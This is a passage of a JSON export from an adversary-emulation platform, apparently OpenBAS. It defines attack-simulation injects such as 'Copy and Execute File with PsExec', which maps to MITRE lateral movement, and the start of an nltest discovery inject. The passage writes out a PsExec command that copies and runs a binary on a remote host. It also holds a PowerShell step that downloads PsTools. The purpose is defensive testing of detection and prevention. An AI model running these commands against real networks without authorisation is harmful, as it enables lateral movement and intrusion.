          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        }, {
          "key" : "command_path",
          "label" : "command_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "C:\\Windows\\System32\\cmd.exe",
          "type" : "text"
        }, {
          "key" : "remote_host",
          "label" : "remote_host",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "\\\\localhost",
          "type" : "text"
        }, {
          "key" : "psexec_exe",
          "label" : "psexec_exe",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\PsTools_zip_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\PsTools_zip_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/PsTools.zip",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\PsTools_zip_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\PsTools_zip_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/PsTools.zip",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\PsTools_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\PsTools_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/PsTools",
          "type" : "text"
        }, {
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\PsTools\\PsExec_exe_atomicredteam_path",
          "label" : "PathToAtomicsFolder\\__\\ExternalPayloads\\PsTools\\PsExec_exe_atomicredteam_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "./ExternalPayloads/../ExternalPayloads/PsTools/PsExec.exe",
          "type" : "text"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "6e131ee9-fc2d-4115-a0cb-ffeec21af568",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "6e131ee9-fc2d-4115-a0cb-ffeec21af568",
      "injector_contract_labels" : {
        "en" : "Copy and Execute File with PsExec",
        "fr" : "Copy and Execute File with PsExec"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Copy and Execute File with PsExec\",\"fr\":\"Copy and Execute File with PsExec\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"},{\"key\":\"command_path\",\"label\":\"command_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"type\":\"text\"},{\"key\":\"remote_host\",\"label\":\"remote_host\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"\\\\\\\\localhost\",\"type\":\"text\"},{\"key\":\"psexec_exe\",\"label\":\"psexec_exe\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\PsExec.exe\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\PsTools_zip_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\PsTools_zip_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/PsTools.zip\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\PsTools_zip_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\PsTools_zip_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/PsTools.zip\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\PsTools_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\PsTools_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/PsTools\",\"type\":\"text\"},{\"key\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\PsTools\\\\PsExec_exe_atomicredteam_path\",\"label\":\"PathToAtomicsFolder\\\\__\\\\ExternalPayloads\\\\PsTools\\\\PsExec_exe_atomicredteam_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"./ExternalPayloads/../ExternalPayloads/PsTools/PsExec.exe\",\"type\":\"text\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"6e131ee9-fc2d-4115-a0cb-ffeec21af568\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "7256601f-a98d-4488-8264-e62b62c3f17c",
        "payload_type" : "Command",
        "payload_name" : "Copy and Execute File with PsExec",
        "payload_description" : "Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "c0ce4192-7224-42ec-b640-bec6a9501890",
          "attack_pattern_name" : "SMB/Windows Admin Shares",
          "attack_pattern_description" : "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)",
          "attack_pattern_external_id" : "T1021.002",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "e03bd741-2536-48d6-8fd5-a36e0d2a3f2a",
            "phase_external_id" : "TA0008",
            "phase_stix_id" : "x-mitre-tactic--7141578b-e50b-4dcc-bfa4-08a8dd689e9e",
            "phase_name" : "Lateral Movement",
            "phase_shortname" : "lateral-movement",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to move through your environment.\n\nLateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier. ",
            "phase_order" : 9
          } ]
        } ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : true,
        "payload_arguments" : [ {
          "type" : "text",
          "key" : "command_path",
          "default_value" : "C:\\Windows\\System32\\cmd.exe",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "remote_host",
          "default_value" : "\\\\localhost",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "psexec_exe",
          "default_value" : "PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\PsTools_zip_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/PsTools.zip",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\PsTools_zip_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/PsTools.zip",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\PsTools_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/PsTools",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "PathToAtomicsFolder\\__\\ExternalPayloads\\PsTools\\PsExec_exe_atomicredteam_path",
          "default_value" : "./ExternalPayloads/../ExternalPayloads/PsTools/PsExec.exe",
          "description" : null,
          "separator" : null
        } ],
        "payload_prerequisites" : [ {
          "executor" : "psh",
          "get_command" : "New-Item -Type Directory \"#{PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path}\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"#{PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path}\\PsTools.zip\"\nExpand-Archive \"#{PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path}\\PsTools.zip\" \"#{PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path}\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_exe}\") -Force | Out-Null\nCopy-Item \"#{PathToAtomicsFolder\\__\\ExternalPayloads_atomicredteam_path}\\PsTools\\PsExec.exe\" \"#{psexec_exe}\" -Force\n",
          "check_command" : "if (Test-Path \"#{psexec_exe}\") { exit 0} else { exit 1}\n",
          "description" : "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_exe})\n"
        } ],
        "payload_external_id" : "0eb03d41-79e4-4393-8e57-6344856be1cf",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:27.865933Z",
        "payload_updated_at" : "2025-07-03T14:49:14.133083Z",
        "command_executor" : "cmd",
        "command_content" : "\"#{psexec_exe}\" #{remote_host} -accepteula -c #{command_path}\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:27.879004Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:27.879004Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "c0ce4192-7224-42ec-b640-bec6a9501890",
        "attack_pattern_name" : "SMB/Windows Admin Shares",
        "attack_pattern_description" : "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)",
        "attack_pattern_external_id" : "T1021.002",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "e03bd741-2536-48d6-8fd5-a36e0d2a3f2a",
          "phase_external_id" : "TA0008",
          "phase_stix_id" : "x-mitre-tactic--7141578b-e50b-4dcc-bfa4-08a8dd689e9e",
          "phase_name" : "Lateral Movement",
          "phase_shortname" : "lateral-movement",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to move through your environment.\n\nLateral Movement consists of techniques that adversaries use to enter and control remote systems on a network. Following through on their primary objective often requires exploring the network to find their target and subsequently gaining access to it. Reaching their objective often involves pivoting through multiple systems and accounts to gain. Adversaries might install their own remote access tools to accomplish Lateral Movement or use legitimate credentials with native network and operating system tools, which may be stealthier. ",
          "phase_order" : 9
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "d962715f-bac1-4788-8981-6a82034af1ee",
    "inject_title" : "Remote System Discovery - nltest",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "target_domain" : "%userdnsdomain%",
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ {
      "dependency_relationship" : {
        "inject_parent_id" : "224c6711-0e34-4fb0-8d32-6ec57ee79dac",
        "inject_children_id" : "d962715f-bac1-4788-8981-6a82034af1ee"
      },
      "dependency_condition" : {
        "mode" : "and",
        "conditions" : [ {
          "key" : "Execution",
          "value" : true,
          "operator" : "eq"
        } ]
      },
      "dependency_created_at" : "2025-07-04T15:49:29.277378Z",
      "dependency_updated_at" : "2025-07-04T15:49:29.277389Z"
    } ],
    "inject_depends_duration" : 180,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Remote System Discovery - nltest",
          "fr" : "Remote System Discovery - nltest"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        }, {
          "key" : "target_domain",
          "label" : "target_domain",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "%userdnsdomain%",
          "type" : "text"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "139e69d2-8e3d-4f22-a97b-ed5bf6d54314",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
